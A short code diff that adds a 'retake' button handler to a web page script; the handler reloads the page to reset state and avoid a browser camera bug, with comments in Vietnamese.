+    document.getElementById('retakeBtn').addEventListener('click', () => {
+        // Reload lại hẳn trang để mọi thứ (cả main.js) được reset sạch sẽ từ đầu
+        // Đảm bảo không dính bug camera của trình duyệt
+        window.location.reload();
     });
 </script>
 
